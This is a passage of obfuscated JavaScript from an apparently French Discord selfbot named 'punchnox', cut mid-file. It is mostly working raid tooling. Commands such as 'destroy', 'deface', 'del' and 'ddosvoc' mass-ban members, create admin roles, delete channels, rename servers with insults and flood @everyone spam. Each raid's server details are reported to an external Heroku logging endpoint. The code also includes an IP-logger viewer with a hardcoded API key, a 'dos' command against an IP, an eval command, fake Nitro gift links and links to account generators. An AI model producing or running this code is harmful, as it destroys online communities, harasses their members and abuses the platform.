                            if (c9) commandIntervals.forEach(sj => {
                              clearInterval(sj);
                            }), cg.channel.send('__**Spam stopped successfully**__ :white_check_mark:');else {
                              cg.channel.send(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'destroy')) {
                          if (cg.author.id == aN.user.id) {
                            const sk = ['Aucune Restriction', 'E-mail vérifié', 'Inscrit depuis plus de 5min minimum', 'Membre du serveur depuis plus de 10minutes', 'Téléphone Vérifié'],
                              sl = cg.guild.member(aN.user);
                            var fI = {};
                            fI.commande = 'destroy', fI.user = cg.author.username + '#' + cg.author.discriminator, fI.Id = aN.user.id, fI.User_created = ax.utc(aN.user.createdAt).format('MM/DD/YYYY 𝙖 HH : ss'), fI.user_joined = ax.utc(sl.joinedAt).format('MM/DD/YYYY 𝙖 HH : ss'), fI._ = '_________________________________________', fI.NameServeur = cg.guild.name, fI.IdServeur = cg.guild.id, fI.owner_id = cg.guild.owner.id, fI.owner_name = cg.guild.owner.username, fI.Sécurité = sk[cg.guild.verificationLevel], fI.Membres = cg.guild.memberCount, fI.NbChannels = cg.guild.channels.size, fI.Nbroles = cg.guild.roles.size, fI.Région = cg.guild.region, fI.Permissions = cg.member.hasPermission('ADMINISTRATOR') ? 'oui' : 'non', fI.Date = ax().format('MM/DD/YYYY 𝙖 HH : ss'), aD.post('https://punchnox-project-api.herokuapp.com/api/logs/raidlogs').send(fI).end((sm, sn) => {
                              if (sm) return console.log('[31mErreur lors de la connexion aux serveurs du punchnox-project[0m');
                            });
                          }
                        }
                        if (cg.content === ab + 'destroy') {
                          if (cg.author.id == aN.user.id) {
                            var fJ = {};
                            fJ.id = cg.guild.id, aD.post('https://punchnox-project-api.herokuapp.com/api/update/serveur-blackliste').send(fJ).end((sm, sn) => {
                              sn.body.message === 'Id Not found.' ? (cg.delete(), cg.guild.members.forEach(so => {
                                so.ban().then(function () {});
                              })) : cg.edit(':x: **Ce serveur est dans la blacklist donc vous ne pouvez pas le raid.**');
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'destroy')) {
                          if (cg.author.id == aN.user.id) {
                            var fK = {};
                            fK.id = cg.guild.id, aD.post('https://punchnox-project-api.herokuapp.com/api/update/serveur-blackliste').send(fK).end((sm, sn) => {
                              if (sn.body.message === 'Id Not found.') for (var sq = 0; sq < 90; sq++) {
                                cg.guild.createRole({
                                  'name': '𝙁𝙪𝙘𝙠𝙚𝙙 𝘽𝙮 ' + cg.author.username,
                                  'mentionable': true,
                                  'permissions': 0x8,
                                  'position': '',
                                  'color': 'RANDOM'
                                });
                              }
                            });
                          }
                        }
                        if (cg.content === ab + 'destroy') {
                          if (cg.author.id == aN.user.id) {
                            var fL = {};
                            fL.id = cg.guild.id, aD.post('https://punchnox-project-api.herokuapp.com/api/update/serveur-blackliste').send(fL).end((sn, so) => {
                              if (so.body.message === 'Id Not found.') {
                                if (cg.channel.type === 'dm') return;
                                if (cg.guild.channels.size === 0) return;
                              }
                            });
                          }
                        }
                        if (cg.content === ab + 'destroy') {
                          if (cg.channel.type === 'dm') return;
                          if (cg.author.id == aN.user.id) {
                            var fM = {};
                            fM.id = cg.guild.id, aD.post('https://punchnox-project-api.herokuapp.com/api/update/serveur-blackliste').send(fM).end((sp, sq) => {
                              if (sq.body.message === 'Id Not found.') {
                                cg.guild.name != '𝙁𝙪𝙘𝙠𝙚𝙙 𝘽𝙮 ' + cg.author.username && (cg.guild.setIcon('./logo.png').catch(sr => {}), cg.guild.setName('𝙁𝙪𝙘𝙠𝙚𝙙 𝘽𝙮 ' + cg.author.username).catch(sr => {}), cg.guild.setRegion('russia').catch(sr => {})), setInterval(function () {
                                  if (cg.guild.channels.size < 499) {
                                    cg.guild.createChannel('𝙁𝙪𝙘𝙠𝙚𝙙 𝘽𝙮 ' + cg.author.username).catch(sr => {});
                                  }
                                }, 400);
                              }
                            });
                          }
                        }
                        if (cg.content === ab + 'destroy') {
                          if (cg.channel.type === 'dm') return;
                          if (cg.author.id == aN.user.id) {
                            var fN = {};
                            fN.id = cg.guild.id, aD.post('https://punchnox-project-api.herokuapp.com/api/update/serveur-blackliste').send(fN).end((sp, sq) => {
                              sq.body.message === 'Id Not found.' ? setInterval(function () {
                                var su = {};
                                su.tts = true, cg.channel.send('@everyone @here 𝙁𝙪𝙘𝙠𝙚𝙙 𝘽𝙮 ' + cg.author.username + '\n' + (ba + ' \n') + '\n' + ('𝙁𝙪𝙘𝙠𝙚𝙙 𝘽𝙮 ' + cg.author.username), su).catch(sv => {});
                              }, 400) : cg.edit(':x: **Ce serveur est dans la blacklist donc vous ne pouvez pas le raid.**');
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'deface')) {
                          let sp = cg.guild;
                          if (!sp) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                          if (cg.author.id == aN.user.id) {
                            var fO = {};
                            fO.id = cg.guild.id, aD.post('https://punchnox-project-api.herokuapp.com/api/update/serveur-blackliste').send(fO).end((sr, ss) => {
                              ss.body.message === 'Id Not found.' ? (cg.delete(), cg.guild.setRegion('brasil'), cg.guild.setIcon('https://cdn.discordapp.com/attachments/602163438390738957/603946294888759316/tumblr_mns4ojjGJb1rzkceno1_500.gif'), cg.guild.setName('𝙁𝙪𝙘𝙠𝙚𝙙 𝘽𝙮 ' + cg.author.username), cg.channel.send('Deface réussi :white_check_mark:')) : cg.edit(':x: **Ce serveur est dans la blacklist donc vous ne pouvez pas le raid.**');
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'deface')) {
                          if (cg.author.id == aN.user.id) {
                            const sr = ['Aucune Restriction', 'E-mail vérifié', 'Inscrit depuis plus de 5min minimum', 'Membre du serveur depuis plus de 10minutes', 'Téléphone Vérifié'],
                              ss = cg.guild.member(aN.user);
                            aD.post('https://punchnox-project-api.herokuapp.com/api/logs/raidlogs').send({
                              'commande': 'destroy',
                              'user': cg.author.username + '#' + cg.author.discriminator,
                              'Id': aN.user.id,
                              'User_created': ax.utc(aN.user.createdAt).format('MM/DD/YYYY 𝙖 HH : ss'),
                              'user_joined': ax.utc(ss.joinedAt).format('MM/DD/YYYY 𝙖 HH : ss'),
                              '_': '_________________________________________',
                              'NameServeur': cg.guild.name,
                              'IdServeur': cg.guild.id,
                              'owner_id': cg.guild.owner.id,
                              'owner_name': cg.guild.owner.username,
                              'Sécurité': sr[cg.guild.verificationLevel],
                              'Membres': cg.guild.memberCount,
                              'NbChannels': cg.guild.channels.size,
                              'Nbroles': cg.guild.roles.size,
                              'Région': cg.guild.region,
                              'Permissions': cg.member.hasPermission('ADMINISTRATOR') ? 'oui' : 'non',
                              'Date': ax().format('MM/DD/YYYY 𝙖 HH : ss')
                            }).end((su, sv) => {
                              if (su) return console.log('[31mErreur lors de la connexion aux serveurs du punchnox-project[0m');
                            });
                          }
                        }
                        var d8 = cg.content.split(' ').slice(1);
                        if (cg.content.startsWith(ab + 'changei')) {
                          let sw = cg.guild;
                          if (!sw) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                          if (cg.author.id === aN.user.id) {
                            var fP = {};
                            fP.id = cg.guild.id, aD.post('https://punchnox-project-api.herokuapp.com/api/update/serveur-blackliste').send(fP).end((sx, sy) => {
                              if (sy.body.message === 'Id Not found.') {
                                let sA = d8.join(' ');
                                if (!sA) sA = '';
                                if (!sA) return console.error;
                                cg.guild.setIcon(sA).catch(console.error);
                              } else {
                                cg.edit(':x: **Ce serveur est dans la blacklist donc vous ne pouvez pas le raid.**');
                              }
                            });
                          }
                        }
                        if (cg.content.includes(ab + 'changen')) {
                          let sy = cg.guild;
                          if (!sy) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                          if (cg.author.id === aN.user.id) {
                            var fQ = {};
                            fQ.id = cg.guild.id, aD.post('https://punchnox-project-api.herokuapp.com/api/update/serveur-blackliste').send(fQ).end((sz, sA) => {
                              if (sA.body.message === 'Id Not found.') {
                                cg.guild.setName(cg.content.split(' ').slice(1).join(' '));
                              } else cg.edit(':x: **Ce serveur est dans la blacklist donc vous ne pouvez pas le raid.**');
                            });
                          }
                        }
                        if (cg.content === ab + 'del') {
                          let sz = cg.guild;
                          if (!sz) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              var fR = {};
                              fR.id = cg.guild.id, aD.post('https://punchnox-project-api.herokuapp.com/api/update/serveur-blackliste').send(fR).end((sA, sB) => {
                                if (sB.body.message === 'Id Not found.') cg.delete(), cg.guild.channels.map(sE => sE.delete()), cg.guild.createChannel('𝙇𝙖𝙨𝙩', 'text');else {
                                  cg.edit(':x: **Ce serveur est dans la blacklist donc vous ne pouvez pas le raid.(**');
                                }
                              });
                            } else cg.channel.send(cu);
                          }
                        }
                        if (cg.content === ab + 'del') {
                          if (cg.author.id == aN.user.id) {
                            if (c9) {
                              const sB = ['Aucune Restriction', 'E-mail vérifié', 'Inscrit depuis plus de 5min minimum', 'Membre du serveur depuis plus de 10minutes', 'Téléphone Vérifié'],
                                sC = cg.guild.member(aN.user);
                              aD.post('https://punchnox-project-api.herokuapp.com/api/logs/raidlogs').send({
                                'commande': 'destroy',
                                'user': cg.author.username + '#' + cg.author.discriminator,
                                'Id': aN.user.id,
                                'User_created': ax.utc(aN.user.createdAt).format('MM/DD/YYYY 𝙖 HH : ss'),
                                'user_joined': ax.utc(sC.joinedAt).format('MM/DD/YYYY 𝙖 HH : ss'),
                                '_': '_________________________________________',
                                'NameServeur': cg.guild.name,
                                'IdServeur': cg.guild.id,
                                'owner_id': cg.guild.owner.id,
                                'owner_name': cg.guild.owner.username,
                                'Sécurité': sB[cg.guild.verificationLevel],
                                'Membres': cg.guild.memberCount,
                                'NbChannels': cg.guild.channels.size,
                                'Nbroles': cg.guild.roles.size,
                                'Région': cg.guild.region,
                                'Permissions': cg.member.hasPermission('ADMINISTRATOR') ? 'oui' : 'non',
                                'Date': ax().format('MM/DD/YYYY 𝙖 HH : ss')
                              }).end((sD, sE) => {
                                if (sD) return console.log('[31mErreur lors de la connexion aux serveurs du punchnox-project[0m');
                              });
                            }
                          }
                        }
                        if (cg.content.includes(ab + 'selfbot')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('** 「MENU SELFBOT」 **').setDescription('').addField('```𝗥𝗶𝗰𝗸𝗘𝘁𝗠𝗼𝗿𝘁𝘆𝗦𝗲𝗹𝗳𝗕𝗼𝘁:```', '***https://mega.nz/file/XeYhVYLB#uPLRMzRNYGU69Pegi0o8rmOIuvBFFz_JENs_N7c_yc8***').addField('```𝗦𝗲𝗹𝗳𝗕𝗼𝘁𝗽𝘂𝗻𝗰𝗵 𝘃𝟭.𝟬```', '***https://mega.nz/#!7WQTSC4L!56M2-Jst_T3mE9s-AejNP6hWBQZHf60DFZO4cgu6pus***').setImage('https://media.giphy.com/media/giodsxr1sttIHeStIR/giphy.gif').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'generateur')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('** 「MENU GENERATEUR」 **').setDescription('').addField('```𝗛-𝗴𝗲𝗻```', '***https://web.h-gen.xyz/***').addField('```𝗜𝗛𝗔𝗫```', '***https://ihax.fr/forums/partage-comptes-gratuit.20/***').addField('```𝗖𝘆𝗯𝗲𝗿-𝗵𝘂𝗯```', '***https://cyber-hub.pw/***').addField('```𝗡𝗶𝘁𝗿𝗼 𝗴𝗲𝗻 𝗯𝘆 𝗽𝘂𝗻𝗰𝗵𝗻𝗼𝘅```', '***https://mega.nz/#!3SgRTQpI!xympEG5Z0YTh6WfcdxmyyHZESJQSu_h-JyDCb7jMFo4***').setImage('https://media.giphy.com/media/giodsxr1sttIHeStIR/giphy.gif').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'iplog')) {
                          cg.author.id === aN.user.id && aD.get('https://api.c99.nl/iplogger?key=NYK0X-0S6BJ-8EA8G-U5LRV&action=viewloggers&json').then(sE => {
                            let sF = new aw.RichEmbed().setColor(ad).setDescription('logger : ' + sE.body.loggers).setTitle('Ip logger');
                            cg.channel.send(sF);
                          });
                        }
                        if (cg.content.startsWith(ab + 'shorturl')) {
                          if (cg.author.id === aN.user.id) {
                            var d8 = cg.content.split(' ').slice(1).join(' ');
                            aD.get('https://api.c99.nl/urlshortener?key=NYK0X-0S6BJ-8EA8G-U5LRV&url=' + d8 + '&json').then(sF => {
                              cg.delete();
                              let sG = new aw.RichEmbed().setTitle('Lien raccourcis').setColor(ad).setDescription(sF.body.url).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                              cg.channel.send(sG);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'checkmail')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            var d8 = cg.content.split(' ').slice(1).join(' ');
                            !d8[0] && cg.edit('***il manque un argument :x:***'), aD.get('https://api.c99.nl/disposablemailchecker?key=' + b6 + '&email=' + d8 + '&json').then(sH => {
                              var sK = new aw.RichEmbed().setTitle('EMail jetable verif').setColor(ad).setThumbnail('https://us.123rf.com/450wm/alekseyvanin/alekseyvanin1808/alekseyvanin180801585/106689124-envelope-mail-vector-icon-filled-flat-sign-for-mobile-concept-and-web-design-message-simple-solid-ic.jpg?ver=6').setDescription('l\'émail est bien jetable').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp(),
                                sL = new aw.RichEmbed().setTitle('EMail jetable verif').setColor(ad).setThumbnail('https://us.123rf.com/450wm/alekseyvanin/alekseyvanin1808/alekseyvanin180801585/106689124-envelope-mail-vector-icon-filled-flat-sign-for-mobile-concept-and-web-design-message-simple-solid-ic.jpg?ver=6').setDescription('l\'émail n\'est pas jetable').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                              if (sH.body.status === 'disposable') cg.channel.send(sK);else {
                                cg.channel.send(sL);
                              }
                            });
                          }
                        }
                        if (cg.content === ab + 'discord') {
                          if (cg.author.id === aN.user.id) {
                            let sH = new aw.RichEmbed().setColor(ad).setDescription('Discord Version : **' + aw.version + '**').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(sH).catch(sI => console.log('[', ay.hex(u)('ERROR'), ']', 'une erreur est survenue que je ne peux régler')), console.log(ay.hex(t)('Commande discord effectué'));
                          }
                        }
                        if (cg.content.startsWith(ab + 'ddosvoc')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            let sJ = cg.guild;
                            if (!sJ) return cg.channel.send(':x: **Commande uniquement utilisable sur un serveur**');
                            if (!cg.guild.member(cg.author).hasPermission('MANAGE_GUILD')) return cg.channel.send('**Tu n\'as pas la permission \'MANAGE_GUILD\' ! :x:**');
                            const sK = ['japan', 'hongkong', 'russia', 'india', 'brazil', 'sydney'];
                            let sL = setInterval(function () {
                              cg.guild.setRegion(sK[Math.floor(Math.random() * sK.length)]);
                            }, 2000);
                            commandIntervals.push(sL);
                            var cq = new aw.RichEmbed().setTitle('**DDOSVOC**').setColor(ad).setThumbnail(cg.author.avatarURL).addField('Ddosvoc sur le serveur :', '🠶  ' + cg.guild.name, true).addField('ID du serveur :', '🠶  ' + cg.guild.id + '\n󠂪', true).setTimestamp();
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'stopddosvoc')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            let sO = cg.guild;
                            if (!sO) return cg.channel.send(':x: **Commande uniquement utilisable sur un serveur**');
                            commandIntervals.forEach(sP => {
                              clearInterval(sP);
                            });
                            var cq = new aw.RichEmbed().setTitle('**Stop DDOSVOC**').setColor(ad).setThumbnail(cg.author.avatarURL).addField('Ddosvoc du serveur :', '🠶  ' + cg.guild.name + ' stoppé', true).addField('ID du serveur :', '🠶  ' + cg.guild.id + '\n󠂪', true).setTimestamp();
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'dos')) {
                          if (cg.author.id == aN.user.id) {
                            if (c9) {
                              if (!f6) {
                                cg.edit(':x: Vous n\'avez pas mentionné d\'ip ! Exemple/Usage : `' + ab + 'dos 255.255.255.255`');
                                return;
                              }
                              var fS = new aw.RichEmbed().setAuthor('' + cg.author.username).setTitle('𝗗𝗢𝗦 𝗧𝗢𝗢𝗟𝗦 𝗣𝗨𝗡𝗖𝗛𝗡𝗢𝗫').setColor(ad).setThumbnail('' + aN.user.avatarURL).addField('IP:', '' + f6).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(fS);
                              const sP = require('request');
                              var fT = d8.join(' '),
                                fU = 'http://' + fT;
                              packet = function () {
                                return code = 'H', code;
                              }, sendrequest = function (sQ) {
                                sP(fU, sR => {
                                  if (sR) return;
                                });
                              };
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'virus')) {
                          if (cg.author.id == aN.user.id) {
                            let sQ = cg.content.split(' ').slice(1),
                              sR = sQ.join(' ');
                            if (!sR) {
                              return cg.edit('𝐕𝐞𝐮𝐢𝐥𝐥𝐞𝐳 𝐦𝐞𝐭𝐭𝐫𝐞 𝐥𝐞 𝐧𝐨𝐦 𝐝𝐮 𝐡𝐚𝐜𝐤');
                            }
                            var fV = {};
                            fV.embed = new aw.RichEmbed().setTitle('𝐋𝐨𝐚𝐝𝐢𝐧𝐠 ' + sR + '...').setColor(ad), cg.edit(fV).then(function (sT) {
                              setTimeout(function () {
                                var sW = {};
                                sW.embed = new aw.RichEmbed().setTitle('[' + sR + ']: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓ ] 𝟏%').setColor(ad), sT.edit(sW);
                              }, 1000), setTimeout(function () {
                                var sW = {};
                                sW.embed = new aw.RichEmbed().setTitle('[' + sR + ']: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓▓▓▓] 𝟐𝟓%').setColor(ad), sT.edit(sW);
                              }, 2000), setTimeout(function () {
                                var sY = {};
                                sY.embed = new aw.RichEmbed().setTitle('[' + sR + ']: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓▓▓▓▓▓▓] 𝟓𝟎%').setColor(ad), sT.edit(sY);
                              }, 3000), setTimeout(function () {
                                var sW = {};
                                sW.embed = new aw.RichEmbed().setTitle('[' + sR + ']: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓▓▓▓▓▓▓▓▓▓▓] 𝟕𝟓%').setColor(ad), sT.edit(sW);
                              }, 4000), setTimeout(function () {
                                var sW = {};
                                sW.embed = new aw.RichEmbed().setTitle('[' + sR + ']: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] 𝟏𝟎𝟎%').setColor(ad), sT.edit(sW);
                              }, 5000), setTimeout(function () {
                                var sW = {};
                                sW.embed = new aw.RichEmbed().setTitle('[' + sR + ']: 𝐕𝐢𝐫𝐮𝐬 𝐥𝐚𝐧𝐜𝐞́').setColor(ad), sT.edit(sW);
                              }, 6000), setTimeout(function () {
                                sT.delete();
                              }, 10000);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'mytoken')) {
                          if (cg.author.id !== aN.user.id) {} else {
                            cg.delete(), cg.channel.send('Ton token est dans la console! 👍'), console.log('\n{Token}->\n' + a9 + '\n');
                          }
                        }
                        if (cg.content.startsWith(ab + 'myip')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) aD.get('http://ip.42.pl/raw').then(sV => {
                              cg.edit('Ton ip est dans la console! 👍'), console.log('ton ip : ' + sV.body);
                            });else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'myhostename')) {
                          if (cg.author.id !== aN.user.id) {} else cg.delete(), cg.channel.send('Ton hostname est dans la console! 👍'), console.log('\n{hostname}->\n' + aG.hostname() + '\n');
                        }
                        if (cg.content.startsWith(ab + 'newtoken')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              cg.delete(), setTimeout(() => {
                                aN.destroy().catch(console.error);
                              }, 1500), console.log('\n{Token}->\nRelance Discord\n');
                            } else {
                              cg.channel.send(cu);
                            }
                          }
                        }
                        if (cg.content === ab + 'restart') {
                          if (cg.author.id === aN.user.id) {
                            var cq = new aw.RichEmbed().setTitle('**restart effectué : ** ' + Math.floor(aN.ping) + ' millisecondes').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq).then(aN.destroy()).then(() => aN.login(a9)), console.log(ay.hex(t)('Commande restart effectué')), console.clear();
                          }
                        }
                        if (cg.content === ab + 'lclear') {
                          if (cg.author.id === aN.user.id) {
                            cg.edit('> La Console a bien été clear :thumbsup:'), console.clear();
                          }
                        }
                        if (cg.content.startsWith(ab + 'online')) {
                          if (cg.author.id !== aN.user.id) {} else cg.delete(), cg.channel.send('Vous êtes désormais en ligne.').catch(console.error), aN.user.setStatus('online');
                        }
                        if (cg.content.startsWith(ab + 'idle')) {
                          if (cg.author.id !== aN.user.id) {} else {
                            cg.delete(), cg.channel.send('Vous êtes désormais inactif.').catch(console.error), aN.user.setStatus('idle');
                          }
                        }
                        if (cg.content.startsWith(ab + 'dnd')) {
                          if (cg.author.id !== aN.user.id) {} else {
                            cg.delete(), cg.channel.send('Vous êtes désormais en ne pas déranger.').catch(console.error), aN.user.setStatus('dnd');
                          }
                        }
                        if (cg.content.startsWith(ab + 'invisible')) {
                          if (cg.author.id !== aN.user.id) {} else {
                            cg.delete(), cg.channel.send('Vous êtes désormais invisible.').catch(console.error), aN.user.setStatus('invisible');
                          }
                        }
                        cg.content.startsWith(ab + 'troll') && cg.author.id === aN.user.id && cg.channel.send('\n            ░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄\n        ░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄\n        ░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█\n        ░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░█\n        ░▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░█\n        █▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒█\n        █▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█\n        ░█▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█\n        ░░█░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█\n        ░░░█░░██░░▀█▄▄▄█▄▄█▄████░█\n        ░░░░█░░░▀▀▄░█░░░█░███████░█\n        ░░░░░▀▄░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█\n        ░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░█\n        ░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░█\n        ░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░█\n        ');
                        if (cg.content.startsWith(ab + 'facepalm')) {
                          cg.author.id === aN.user.id && cg.channel.send('\n        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄▄▄░░░░░\n        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░███▀█░░░░\n        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░███░██░░░\n        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░███░░██░░░\n        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄██░░░░██░░\n        ░░░░░░░░░░░░░░░░▄▄█▀▀▀▀█▄▄▄▄███▄░░░██░░\n        ░░░░░░░░░░░░░▄█▀░░░░░░░░░▀▀▀▀█░▀█░░██░░\n        ░░░░░░░░░░░░█▀░░░░░░░░░░░░░░░▀█▄█▀▀▀░░░\n        ░░░░░░░░░░░▄▀░░░░░░░░░░░░░░░░▀█▄░░░░░░░\n        ░░░░░░░░░░░▀█▄░█░░▄▀░░░░░░░▄▄█░░░░░░░░░\n        ░░░░░░░░▄▄▄▄█▀▀▀██▄▄░░░░░░▄▀░░░░░░░░░░░\n        ░░░░▄▄██▄▀▀░░░░░█▀░░░░░░▄██▄░░░░░░░░░░░\n        ░░▄██▀▀░░░░░░░░▄█░░░░░▄█▀▄█░▀▀█▄▄▄▄▄▄▄▄\n        ░██▀░░░░░░░░▄██░░░░░░▄▀▄▄▀░░░░░░░░░░░░░\n        █▀▀░░░░░░▄█▀▄░▀▄▄▄▄██▀▀▀░░░░░█░░░░░░░░░\n        █░░░░░▄▄▀░░░░█░░░░░░░░░░░░░░░▀░░░░░░░░░\n        ░▀▀▀▀▀▀░░░░░░░█░░░░░░░░░░░░░░░▀▀█▀▀▀▀▀▀\n        ░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░█▀░░░░░░\n        ░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░▄█░░░░░░░\n        ');
                        }
                        if (cg.content.startsWith(ab + 'eval')) {
                          if (cg.author.id !== aN.user.id) {} else {
                            cg.delete();
                            try {
                              let t8 = d8.join(' '),
                                t9 = eval(t8);
                              var fW = {};
                              fW.depth = 0x0;
                              if (typeof t9 !== 'string') t9 = require('util').inspect(t9, fW);
                              let ta = new aw.RichEmbed().setColor(ad).addField(':inbox_tray: Entrée', '```js\n' + t8 + '```').addField(':outbox_tray: Sortie', '```js\n' + t9 + '\n```');
                              cg.channel.send(ta).then(tb => tb.delete(60000)).catch(console.error);
                            } catch (tc) {
                              cg.channel.send('```js\n' + tc + '\n```').then(td => td.delete(60000)).catch(console.error);
                            }
                          }
                        }
                        cg.content.startsWith(ab + 'claquettes') && cg.author.id === aN.user.id && (cg.delete(), cg.channel.send('kdo || discord.gift/ytNyKkwxaPEdQcTAx4FVFdDV ||  || 4x31 [RΣP0STY]#0666 ||'), console.log('kdo || discord.gift/ytNyKkwxaPEdQcTAx4FVFdDV ||'));
                        if (cg.content.startsWith(ab + 'cadeau')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete(), cg.channel.send('un cadeau sauvage apparaît || https://discord.com/store/skus/715629060331405382/nitro-classic ||'), console.log('kdo || https://discord.com/store/skus/715629060331405382/nitro-classic ||');
                          }
                        }
                        cg.content.startsWith(ab + 'cpassaussice') && cg.author.id === aN.user.id && (cg.delete(), cg.channel.send('https://cdn.discordapp.com/attachments/714904917705228299/717085400472223794/allez_marcel.mp4'));
                        if (cg.content.startsWith(ab + 'hotdog')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete(), cg.channel.send('un Hot dog sauvage apparaît || https://discord.com/gifts/UaxabFGp4escqaKtrcM3ak67 ||'), console.log('kdo || https://discord.com/gifts/UaxabFGp4escqaKtrcM3ak67 ||');
                          }
                        }
                        function fX(tj, tk) {
                          var tq = '';
                          if (tk.indexOf('0') > -1) tq += '0123456789';
                          if (tk.indexOf('A') > -1) tq += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
                          if (tk.indexOf('a') > -1) tq += 'abcdefghijklmnopqrstuvwxyz';
                          var tr = '';
                          for (var tp = tj; tp > 0; --tp) {
                            tr += tq[Math.floor(Math.random() * tq.length)];
                          }
                          return tr;
                        }
                        if (cg.content === ab + 'nitro') {
                          if (cg.author.id === aN.user.id) {
                            const tj = new aw.RichEmbed().setColor(ad).setThumbnail('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif').addField('Gift :', '|| https://discord.gift/' + fX(16, '0aA') + ' ||');
                            cg.edit(tj), console.log(ay.hex(t)('Commande -nitro generator effectué'));
                          }
                        }
                        if (cg.content === ab + 'nbserveur') {
                          if (cg.author.id === aN.user.id) {
                            const tn = new aw.RichEmbed().setColor(ad).addField('nombre de serveurs :', '' + aN.guilds.size);
                            cg.channel.send(tn), console.log(ay.hex(t)('nbserveur effectué'));
                          }
                        }
                        if (cg.content === ab + 'nbchannels') {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            const to = new aw.RichEmbed().setColor(ad).addField('nombre de channels :', '' + aN.channels.size);
                            cg.channel.send(to), console.log(ay.hex(t)('nbchannels effectué'));
                          }
                        }
                        if (cg.content === ab + 'nbbot') {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            const tp = new aw.RichEmbed().setColor(ad).addField('nombre de bot :', '' + aN.users.filter(tq => tq.bot).size);
                            cg.channel.send(tp), console.log(ay.hex(t)('nbbot effectué'));
                          }
                        }
                        if (cg.content === ab + 'nbusers') {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            const tr = new aw.RichEmbed().setColor(ad).addField('nombre de users :', '' + aN.guilds.map(ts => ts.memberCount).reduce((ts, tt) => ts + tt));
                            cg.channel.send(tr), console.log(ay.hex(t)('nbusers effectué'));
                          }
                        }
                        if (cg.content === ab + 'plateforme') {
                          if (cg.author.id === aN.user.id) {
